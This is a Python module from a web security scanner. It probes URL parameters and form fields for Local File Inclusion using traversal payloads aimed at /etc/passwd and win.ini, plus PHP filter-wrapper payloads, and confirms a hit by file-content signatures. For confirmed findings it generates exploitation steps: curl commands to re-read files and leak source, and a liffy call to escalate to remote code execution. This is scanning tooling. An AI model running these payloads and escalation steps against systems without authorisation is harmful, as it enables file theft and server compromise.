"""
lfi_detect — detects Local File Inclusion / path traversal in parameters and form fields.

It requests well-known system files through traversal payloads (with bypass and encoding
variants) and confirms the read by FILE-CONTENT signatures, never by guesswork:
  • /etc/passwd        → "root:x:0:0:" line
  • Windows win.ini    → "[fonts]" / "[extensions]"
  • PHP filter wrapper → a base64 blob that decodes to "<?php" (source disclosure)

A confirmed read is HIGH (it discloses files and often chains to RCE via log poisoning).
Skipped in safe mode.
"""
from __future__ import annotations

import base64
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

from scanner.engine import Finding, Severity, ScanEngine
from scanner.vulns._common import Injector, evidence, is_safe_mode, iter_injectors

MODULE = "lfi_detect"

_PASSWD_RE = re.compile(r"root:.*?:0:0:", re.IGNORECASE)
_WININI_RE = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.IGNORECASE)
_B64_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")

# (payload, signature_kind)
_PAYLOADS: list[tuple[str, str]] = [
    ("../../../../../../../../etc/passwd",            "passwd"),
    ("....//....//....//....//....//etc/passwd",       "passwd"),
    ("..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",       "passwd"),
    ("/etc/passwd",                                    "passwd"),
    ("../../../../../../../../etc/passwd%00",           "passwd"),
    ("..\\..\\..\\..\\..\\..\\windows\\win.ini",        "winini"),
    ("../../../../../../../../windows/win.ini",          "winini"),
    ("php://filter/convert.base64-encode/resource=index.php",   "phpfilter"),
    ("php://filter/convert.base64-encode/resource=index",       "phpfilter"),
]


def _b64_has_php(text: str) -> bool:
    for blob in _B64_RE.findall(text)[:20]:
        try:
            decoded = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
        except Exception:  # noqa: BLE001
            continue
        if b"<?php" in decoded or b"<?=" in decoded:
            return True
    return False


def _confirm(text: str, kind: str) -> str | None:
    if kind == "passwd" and (m := _PASSWD_RE.search(text)):
        return m.group(0)
    if kind == "winini" and _WININI_RE.search(text):
        return "win.ini contents"
    if kind in ("phpfilter", "phpfilter") and _b64_has_php(text):
        return "base64-encoded PHP source"
    return None


def _exploitation_steps(inj: Injector, payload: str) -> list[dict]:
    """Weaponise a confirmed LFI: read more files, leak source, escalate to RCE. Authorised targets only."""
    if inj.proof is None:
        return [{"step": 1, "description": "Re-issue the confirmed traversal payload in this form field.",
                 "command": f"<inject into {inj.label}>: {payload}"}]
    return [
        {"step": 1, "description": "Re-read the disclosed system file to confirm arbitrary file read.",
         "command": f'curl -sk "{inj.proof(payload)}"'},
        {"step": 2, "description": "Leak application source via the PHP base64 filter wrapper.",
         "command": f'curl -sk "{inj.proof("php://filter/convert.base64-encode/resource=index.php")}" | base64 -d'},
        {"step": 3, "description": "Escalate to RCE through log poisoning / wrapper chains.",
         "command": f'liffy "{inj.proof(payload)}"'},
    ]


def _finding(inj: Injector, payload: str, signal: str,
             proof_lines: list[str] | None = None) -> Finding:
    proof_url = inj.proof(payload) if inj.proof else None
    return Finding(
        module=MODULE,
        title=f"Local File Inclusion / Path Traversal: {inj.param}",
        description=(f"Input to {inj.label} reads arbitrary server files. Payload: {payload!r}. "
                     f"Confirmed by content: {signal!r}. This discloses sensitive files and can "
                     "escalate to remote code execution (e.g. log/session poisoning)."),
        severity=Severity.HIGH,
        recommendation=("Never build file paths from user input. Use a fixed allowlist of identifiers, "
                        "resolve and canonicalise paths, and reject traversal sequences and wrappers."),
        raw={"location": inj.label, "parameter": inj.param, "payload": payload,
             "signal": signal, "proof_url": proof_url, "confidence": "high",
             "evidence": proof_lines or [f"injected into {inj.label}: {payload}"],
             "exploitation": _exploitation_steps(inj, payload)},
    )


def _test(inj: Injector) -> Finding | None:
    for payload, kind in _PAYLOADS:
        resp = inj.inject(payload)
        if resp is not None and (signal := _confirm(resp.text, kind)):
            return _finding(inj, payload, signal,
                            evidence(inj, payload, resp,
                                     indicator=f"file content disclosed: {signal}"))
    return None


def run(engine: ScanEngine) -> list[Finding]:
    if is_safe_mode(engine):
        return [Finding(MODULE, "LFI Scan Skipped (Safe Mode)",
                        "Active path-traversal probing was skipped because safe mode is enabled.",
                        Severity.INFO, "Re-run without safe mode on an authorised target.",
                        {"reason": "safe_mode", "confidence": "high"})]

    injectors = iter_injectors(engine)
    if not injectors:
        return [Finding(MODULE, "LFI: No Injectable Inputs Found",
                        "No URL parameters or form fields were discovered to test.",
                        Severity.INFO, "", {"confidence": "high"})]

    findings: list[Finding] = []
    with ThreadPoolExecutor(max_workers=engine.threads) as pool:
        for result in pool.map(_test, injectors):
            if result:
                findings.append(result)

    if not findings:
        return [Finding(MODULE, "LFI: None Detected",
                        f"Tested {len(injectors)} input(s) with traversal and PHP-wrapper payloads.",
                        Severity.INFO, "", {"inputs_tested": len(injectors), "confidence": "high"})]
    return findings
